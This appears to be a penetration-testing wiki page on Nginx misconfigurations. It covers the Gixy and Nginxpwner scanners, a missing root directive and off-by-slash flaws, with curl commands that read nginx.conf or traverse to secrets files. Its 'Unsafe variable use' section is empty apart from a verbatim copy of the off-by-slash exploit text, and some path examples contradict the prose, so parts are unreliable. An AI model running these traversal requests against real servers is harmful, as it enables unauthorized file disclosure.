# Nginx 

## Theory 

NGINX is open source software for web serving, reverse proxying, caching, load balancing, media streaming, and more. But there is some common **Nginx misconfigurations** that, if left unchecked, leave the web site vulnerable to attack.

## Misconfigurations 

### Tools 

There are several tools available, such as [Gixy](https://github.com/yandex/gixy) and [Nginxpwner](https://github.com/stark0de/nginxpwner), which can automate the process of identifying misconfigurations in Nginx.

{% tabs %}
{% tab title="Gixy" %}
[Gixy](https://github.com/yandex/gixy) is a tool to analyze Nginx configuration. The main goal of Gixy is to prevent security misconfiguration and automate flaw detection. This is a static files analyzer.

```bash
gixy /etc/nginx/nginx.conf
```
{% endtab %}
{% tab title="Nginxpwner" %}
[Nginxpwner](https://github.com/stark0de/nginxpwner) will dynamicly look for common Nginx misconfigurations and vulnerabilities.

```bash
#Target tab in Burp, select host, right click, copy all URLs in this host, copy to a file
cat urllist | unfurl paths | cut -d"/" -f2-3 | sort -u > /tmp/pathlist 
#Or get the list of paths you already discovered in the application in some other way. 
#Note: the paths should not start with /

#Finally, run it
python3 nginxpwner.py https://example.com /tmp/pathlist
```
{% endtab %}
{% endtabs %}

### Missing root location

{% tabs %}
{% tab title="Enumeration" %}
The **root** directive specifies the root folder for Nginx. In the following example, the root folder is `/etc/nginx` which means that we can reach files within that folder.
```
server {
        root /etc/nginx;

        location /hello.txt {
                try_files $uri $uri/ =404;
                proxy_pass http://127.0.0.1:8080/;
        }
}
```
In the above example, the root folder is `/etc/nginx` which means that we can reach files within that folder. The configuration does not have a location for `/ (location / {...})`
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, the root directive will be globally set, meaning that requests to `/` will take you to the local path `/etc/nginx`.  
```bash
#We can get sensitive files as the nginx.conf
curl http://example.com/nginx.conf
```
{% endtab %}
{% endtabs %}


### Off-By-Slash Misconfiguration

{% tabs %}
{% tab title="Enumeration" %}
With the Off-by-slash misconfiguration, it is possible to traverse one step up the path due to a missing slash.  
Inside the Nginx configuration look the "location" statements, if someone looks like:
```
#Missing slash with alias directive
location /imgs { 
    alias /path/images/;
}

#Missing slash with proxy_pass directive
location /api {
    proxy_pass http://apiserver/v1/;
}
```
{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an LFI vulnerability because `/imgs../secrets.txt` will be transform to `/path/images/../secrets.txt`

```bash
#We can get sensitive files
curl http://example.com/imgs/../../secrets.txt

curl http://example.com/api/../../secrets.txt
```
{% endtab %}
{% endtabs %}

### Unsafe variable use

{% tabs %}
{% tab title="Enumeration" %}

{% endtab %}
{% tab title="Exploit" %}
Because of this missconfiguration in the previous example, there is an LFI vulnerability because `/imgs../secrets.txt` will be transform to `/path/images/../secrets.txt`

```bash
#We can get sensitive files
curl http://example.com/imgs/../../secrets.txt

curl http://example.com/api/../../secrets.txt
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/" %}
{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" %}
